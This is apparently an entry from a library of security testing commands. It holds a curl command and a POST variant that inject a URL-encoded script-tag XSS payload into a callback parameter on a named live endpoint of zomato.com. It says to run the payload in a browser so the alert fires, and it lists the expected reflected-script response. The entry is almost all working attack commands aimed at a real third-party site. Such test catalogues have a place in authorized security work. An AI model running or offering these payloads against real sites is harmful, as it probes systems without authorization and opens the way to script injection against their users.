---
id: cmd-uuid-2
data: >-
  curl
  "https://www.zomato.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E"
  -v
tags:
  - xss
  - payload-test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:47.291Z'
verified: false
validated: true
submitted: true
---
# curl-test-xss-alert

## Command

```bash
curl "https://www.zomato.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E" -v
```

## Description

Tests XSS by injecting a URL-encoded script alert; use in browser for execution, curl for response inspection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -v | Verbose output | No |
| callback | Encoded payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.zomato.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E"
```

### With POST

```bash
curl -X POST -d 'callback=<script>alert(1)</script>' https://www.zomato.com/php/instagram_tag_relay
```

## Expected Output

Response with reflected script; in browser, alert triggers.

## Related

- [[procedures/Test-Reflected-XSS-with-JavaScript-Payload]]
